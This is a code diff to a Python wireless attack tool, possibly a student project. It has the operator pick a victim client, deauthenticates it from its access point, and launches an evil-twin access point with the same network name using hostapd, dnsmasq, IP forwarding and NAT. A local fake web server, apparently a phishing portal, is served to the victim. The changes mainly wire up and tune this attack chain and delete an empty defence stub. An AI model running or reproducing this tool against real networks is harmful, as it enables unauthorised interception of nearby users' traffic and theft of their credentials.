@@ -109,7 +109,7 @@ def choose_user_to_attack(user_list):
         chosen_user = captured[chosen_user - 1][1]
         print("Chosen Victim is ", chosen_user)
     except:
-        print("ERROR: Choose a useSr with an index from the list above")
+        print("ERROR: Choose a user with an index from the list above")
         choose_user_to_attack(user_list)
 
     return chosen_user
@@ -136,13 +136,32 @@ def create_fake_ap(iface, victim, ap_name):
     print(f"\n*****\nFake AP Created:\nAP Name: {ap_name}\nMac Address: {fake_mac_addr}\n*****")
 
 
+def activate_fake_ap(iface, ssid):
+    helper.reset()
+    helper.kill_processes()
+    helper.create_hostapd_file(iface, ssid)
+    helper.create_dnsmasq_file(iface)
+    os.system(f"ifconfig {iface} 10.0.0.1 netmask 255.255.255.0")
+    os.system("route add default gw 10.0.0.1")  # Defining the default gateway
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")  # Enabling IP forwarding: 1-enable, 0-disable
+    helper.ip_tables_config()
+    os.system("sudo dnsmasq -C conf_files/dnsmasq.conf")
+    os.system("sudo gnome-terminal -- sh -c 'node fake_web/index.js'")
+    os.system("sudo hostapd conf_files/hostapd.conf -B")
+    os.system("sudo route add default gw 10.0.0.1")
+
+
+def deactivate_fake_ap():
+    helper.reset()
+
+
 def network_attack(iface):
     global interface_name, ap_list, users
     interface_name = iface
-    change_modes.init_attack_mode()
-    change_modes.active_monitor_mode(iface)
+    # change_modes.init_attack_mode()
+    change_modes.activate_monitor_mode(iface)
 
-    scan_wlan(iface, channel_range=15, timeout=10)
+    scan_wlan(iface, channel_range=3, timeout=5)
     chosen_ap = scan_captured_networks(ap_list, flag=False)
 
     # Found Access Points
@@ -154,21 +173,21 @@ def network_attack(iface):
         else:
             sys.exit(1)
 
-    scan_for_users(iface, channel_range=10, timeout=10)
+    scan_for_users(iface, channel_range=3, timeout=5)
     victim = choose_user_to_attack(users)
 
     deauthenticate_victim(iface, victim, chosen_ap_mac)
+    change_modes.deactivate_monitor_mode(iface)
+
     create_fake_ap(iface, victim, ap_name=chosen_ap[1])
+    activate_fake_ap(iface, ssid=chosen_ap[1])
 
-    helper.create_hostapd_file(iface, chosen_ap[1])
-    helper.create_dnsmasq_file(iface)
-    os.system(f"sudo iwconfig {iface} channel {chosen_ap[2]}")
-    helper.enable_nat()
-    os.system("sudo service apache2 restart")
-    helper.start_ap()
+    time.sleep(30)
+    deactivate_fake_ap()
+
+    # os.system(f"sudo iwconfig {iface} channel {chosen_ap[2]}")
+    # helper.enable_nat("enp2s0f0")
+    # os.system("sudo service apache2 restart")
+    # helper.start_ap()
 
 
-def defend_from_attack():
-    pass
-    # Once we recognize an attack, this next line will block all connections from the input IP address
-    # os.system(f"iptables -A INPUT -s {attacker_ip} -j DROP")
